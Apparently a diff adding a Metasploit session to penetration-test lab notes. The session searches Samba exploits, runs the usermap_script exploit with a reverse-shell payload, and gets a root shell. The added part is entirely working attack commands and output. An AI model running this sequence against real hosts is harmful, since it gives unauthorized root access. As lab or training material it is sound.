@@ -54,7 +54,37 @@ host            port  proto  name         state  info
 192.168.25.140  5001  tcp    java-rmi     open   Java RMI
 192.168.25.140  8080  tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1
 
-msf >
+msf > search samba type:exploit platform:unix
 
+Matching Modules
+================
+
+   Name                                            Disclosure Date  Rank       Description
+   ----                                            ---------------  ----       -----------
+   exploit/linux/samba/setinfopolicy_heap          2012-04-10       normal     Samba SetInformationPolicy AuditEventsInfo 
+   exploit/multi/samba/usermap_script              2007-05-14       excellent  Samba "username map script" Command Execution
+   exploit/unix/misc/distcc_exec                   2002-02-01       excellent  DistCC Daemon Command Execution
+   exploit/unix/webapp/citrix_access_gateway_exec  2010-12-21       excellent  Citrix Access Gateway Command Execution
+
+msf > use exploit/multi/samba/usermap_script
+msf > use payload/cmd/unix/reverse
+
+msf exploit(usermap_script) > exploit
+
+[*] Started reverse TCP double handler on 192.168.10.133:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo n4USa141jwS4wcOn;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "n4USa141jwS4wcOn\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 2 opened (192.168.10.133:4444 -> 192.168.10.1:53249) at 2017-09-06 12:28:09 -0700
+
+whoami
+root
 
 
